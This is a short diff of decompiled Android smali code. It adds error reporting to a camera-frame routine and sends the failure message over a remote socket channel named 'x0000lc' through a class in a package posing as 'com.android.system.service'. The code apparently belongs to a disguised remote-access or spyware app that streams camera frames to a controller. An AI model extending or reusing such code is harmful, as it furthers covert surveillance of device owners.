@@ -82,6 +82,46 @@
 
     invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V
 
+    const-string p1, "error"
+
+    const-string v1, "Frame send failed"
+
+    :try_start_1
+    new-instance v2, Lorg/json/JSONObject;
+
+    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V
+
+    invoke-virtual {v2, p1, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+
+    invoke-static {}, Lcom/android/system/service/e;->a()Lcom/android/system/service/e;
+
+    move-result-object p1
+
+    invoke-virtual {p1}, Lcom/android/system/service/e;->b()Lb/a/b/e;
+
+    move-result-object p1
+
+    const-string v1, "x0000lc"
+
+    const/4 v3, 0x1
+
+    new-array v3, v3, [Ljava/lang/Object;
+
+    const/4 v4, 0x0
+
+    aput-object v2, v3, v4
+
+    invoke-virtual {p1, v1, v3}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;
+    :try_end_1
+    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
+
+    goto :goto_0
+
+    :catch_1
+    move-exception p1
+
+    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V
+
     :goto_0
     invoke-virtual {p2}, Landroid/hardware/Camera;->startPreview()V
 
